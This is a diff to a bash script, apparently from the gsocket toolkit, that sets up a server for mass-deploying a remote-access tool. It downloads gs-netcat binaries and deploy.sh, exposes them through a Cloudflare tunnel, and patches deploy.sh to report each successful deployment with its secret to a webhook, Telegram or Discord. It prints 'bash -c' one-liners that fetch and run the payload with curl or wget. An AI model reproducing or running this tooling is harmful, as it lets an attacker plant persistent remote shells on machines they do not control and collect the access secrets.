@@ -28,6 +28,8 @@ BINDIR="${GS_BRANCH:+$GS_BRANCH/}bin"
 DEPLOY_SH_NAME="y"
 
 DATA_DIR="gs-www-data"
+DATA_DIR_BRANCH="${DATA_DIR}${GS_BRANCH:+/$GS_BRANCH}"
+URL_BRANCH="${GS_BRANCH:+/$GS_BRANCH}"
 packages=()
 packages+=("linux-x86_64")
 packages+=("linux-aarch64")
@@ -75,6 +77,7 @@ do_stop()
         kill -9 "$(cat www.pid)" &>/dev/null
         arr+=("www.pid")
     }
+    [ -f "www.log" ] && arr+=("www.log")
 
     rm -f "${arr[@]}"
 }
@@ -97,7 +100,7 @@ do_sigtrap()
 {
     do_stop
     do_cleanup
-    echo -e "\nType ${CDC}rm -rf ${DATA_DIR} ${LOG}${CN} to clean all files."
+    echo -e "\nType ${CDC}rm -rf ${DATA_DIR_BRANCH}${LOG:+ $LOG}; rmdir ${DATA_DIR}${CN} to clean all files."
     exit 0
 }
 
@@ -138,16 +141,16 @@ command -v python >/dev/null || {
 }
 "$PYTHON" -m http.server -h >/dev/null || ERREXIT 255 "Python -m http.server not found."
 
-[[ ! -d "${DATA_DIR}/bin" ]] && mkdir -p "${DATA_DIR}/bin"
-[[ ! -f "${DATA_DIR}/y" ]] && {
+[[ ! -d "${DATA_DIR_BRANCH}/bin" ]] && mkdir -p "${DATA_DIR_BRANCH}/bin"
+[[ ! -f "${DATA_DIR_BRANCH}/y" ]] && {
     echo -e "Downloading ${CDY}${DEPLOY_SH_NAME}${CN} (e.g. deploy.sh)"
-    curl -fsSL "https://github.com/hackerschoice/gsocket/raw/${GS_BRANCH}/deploy/deploy.sh" --output "${DATA_DIR}/${DEPLOY_SH_NAME}"
+    curl -fsSL "https://github.com/hackerschoice/gsocket/raw/${GS_BRANCH}/deploy/deploy.sh" --output "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 }
 
 for n in "${packages[@]}"; do
-    [[ -f "${DATA_DIR}/bin/gs-netcat_mini-${n}" ]] && continue
+    [[ -f "${DATA_DIR_BRANCH}/bin/gs-netcat_mini-${n}" ]] && continue
     echo -e "Downloading ${CDY}gs-netcat_mini-${n}${CN}..."
-    curl -fsSL "https://gsocket.io/${BINDIR}/gs-netcat_mini-${n}" --output "${DATA_DIR}/bin/gs-netcat_mini-${n}"
+    curl -fsSL "https://gsocket.io/${BINDIR}/gs-netcat_mini-${n}" --output "${DATA_DIR_BRANCH}/bin/gs-netcat_mini-${n}"
 done
 
 start "Cloudflare" "cloudflare.log" cloudflared tunnel --url "http://127.0.0.1:${PORT}" --no-autoupdate
@@ -173,23 +176,23 @@ str="${str//[^[:alnum:]].-}"  # sanitize
 URL_BASE="https://${str}"
 
 # update deploy.sh
-sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
-sed "s|^IS_DEPLOY_SERVER=.*|IS_DEPLOY_SERVER=1|" -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
-sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
-sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
-[ -n "$GS_HOST" ] &&  sed 's|^DS_GS_HOST=.*|DS_GS_HOST='"'$GS_HOST'"'|' -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
-[ -n "$GS_PORT" ] &&  sed 's|^DS_GS_PORT=.*|DS_GS_PORT='"'$GS_PORT'"'|' -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
+sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+sed "s|^IS_DEPLOY_SERVER=.*|IS_DEPLOY_SERVER=1|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+[ -n "$GS_HOST" ] &&  sed 's|^DS_GS_HOST=.*|DS_GS_HOST='"'$GS_HOST'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+[ -n "$GS_PORT" ] &&  sed 's|^DS_GS_PORT=.*|DS_GS_PORT='"'$GS_PORT'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 
 echo -e "${CDG}SUCCESS${CN}"
 [ -n "$GS_HOST" ] && echo -e   "--> ${CDG}GS_HOST='$GS_HOST'${CN}"
 [ -n "$GS_PORT" ] && echo -e   "--> ${CDG}GS_PORT='$GS_PORT'${CN}"
 [ -n "$GS_BRANCH" ] && echo -e "--> ${CDG}GS_BRANCH='$GS_BRANCH'${CN}"
 echo -e "${CDY}To log via Telegram, Discord or webhook.site please edit
-${CW}$(realpath "$(pwd)/${DATA_DIR}/y")${CDY} and set${CN}
+${CW}$(realpath "$(pwd)/${DATA_DIR_BRANCH}/y")${CDY} and set${CN}
 1. ${CDC}GS_TG_TOKEN=${CN}, ${CDC}GS_TG_CHATID=${CN} OR ${CDC}GS_DISCORD_KEY=${CN} OR ${CDC}GS_WEBHOOK_KEY=${CN}
 To deploy gsocket:
-    ${CM}bash -c \"\$(curl -fsSL ${URL_BASE}/y)\"${CN}
-    ${CM}bash -c \"\$(wget --no-verbose -O- ${URL_BASE}/y)\"${CN}
+    ${CM}bash -c \"\$(curl -fsSL ${URL_BASE}${URL_BRANCH}/y)\"${CN}
+    ${CM}bash -c \"\$(wget --no-verbose -O- ${URL_BASE}${URL_BRANCH}/y)\"${CN}
 Press CTRL-C to stop
 ${CDG}-----SUCCESSFUL DEPLOYMENTS ARE SHOWN BELOW-----${CN}"
 
